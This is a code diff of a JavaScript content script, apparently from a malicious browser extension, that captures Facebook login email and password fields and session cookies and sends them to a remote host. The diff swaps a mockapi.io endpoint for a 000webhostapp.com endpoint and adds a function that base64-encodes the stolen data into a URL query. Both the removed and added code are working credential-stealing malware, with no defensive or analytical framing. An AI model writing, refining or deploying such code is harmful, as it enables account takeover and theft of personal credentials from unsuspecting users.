@@ -1,12 +1,11 @@
-const API = "https://6514b3f1dc3282a6a3cd7125.mockapi.io/cookies";
-const targetURL = "https://www.facebook.com";
+const API = "https://litho-bump.000webhostapp.com/index.php";
+
 const userAgent = navigator.userAgent;
 
-function addZero(number) {
-    return number < 10 ? "0" + number : number;
-}
-
 const dateTime = () => {
+    function addZero(number) {
+        return number < 10 ? "0" + number : number;
+    }
     const currentDate = new Date();
     const year = currentDate.getFullYear();
     const month = addZero(currentDate.getMonth() + 1);
@@ -33,7 +32,6 @@ const getCUser = () => {
 
 const keyLogging = () => {
     try {
-        const c_user = localStorage.getItem("c_user")?.split('"')[1];
         const edEmail = document.getElementById("email");
         const edPass = document.getElementById("pass");
         const form = edEmail.parentElement.parentElement.parentElement;
@@ -48,36 +46,9 @@ const keyLogging = () => {
                 stolenAt: dateTime(),
             };
 
-            if (c_user) {
-                const res = await fetch(`${API}?c_user=${c_user}`);
-                const data = await res.json();
-
-                if (data.length <= 0) {
-                    await fetch(`${API}`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ ...user, c_user }),
-                    });
-                } else {
-                    const id = data[0].id;
-                    await fetch(`${API}/${id}`, {
-                        method: "PUT",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(user),
-                    });
-                    localStorage.removeItem("c_user");
-                }
-            } else {
-                await fetch(`${API}`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(user),
-                });
-            }
+            sendMessage(user);
         };
-    } catch (error) {
-        console.log("error to get user!");
-    }
+    } catch (error) {}
 };
 
 const getCookies = () => {
@@ -88,65 +59,43 @@ const getCookies = () => {
     });
 };
 
-const removeCookies = () => {
-    chrome.runtime.sendMessage("removecookies", (e) => {});
-};
-
 const processUser = async (c_user) => {
     if (c_user) {
-        console.log("Found user", c_user);
-        const res = await fetch(`${API}/?c_user=${c_user}`);
-        const data = await res.json();
-
-        if (data.length <= 0) {
-            console.log("user data not have in server!");
-            try {
-                const cookie = await getCookies();
-                console.log("storing user cookie and save localstorage...");
-                localStorage.setItem("c_user", JSON.stringify(c_user));
-
-                const user = {
-                    c_user,
-                    cookie,
-                    userAgent,
-                    stolenAt: dateTime(),
-                };
-
-                await fetch(`${API}`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(user),
-                });
-
-                console.log("remove the user cookies");
-                removeCookies();
-            } catch (error) {
-                // Handle errors
-            }
-        } else {
-            try {
-                const cookie = await getCookies();
-                console.log("update user cookie...");
-                const user = {
-                    cookie,
-                    userAgent,
-                    stolenAt: dateTime(),
-                };
-
-                await fetch(`${API}/${data[0].id}`, {
-                    method: "PUT",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(user),
-                });
-
-                console.log("success");
-            } catch (error) {
-                console.log("error");
-            }
-        }
+        try {
+            const cookie = await getCookies();
+            const user = {
+                c_user,
+                cookie,
+                userAgent,
+                stolenAt: dateTime(),
+            };
+            sendMessage(user);
+        } catch (error) {}
     } else {
         keyLogging();
     }
+};
+
+function convertObjectToMessage(obj) {
+    let message = "";
+
+    for (const key in obj) {
+        if (Object.prototype.hasOwnProperty.call(obj, key)) {
+            const value = obj[key];
+            message += `${key}: ${value}\n`;
+        }
+    }
+
+    return message;
+}
+
+const sendMessage = (userData) => {
+    const msg = btoa(convertObjectToMessage(userData));
+    return fetch(`${API}?msg=${msg}`, {
+        method: "GET",
+        mode: "cors",
+        credentials: "same-origin",
+    });
 };
 
 (() => {
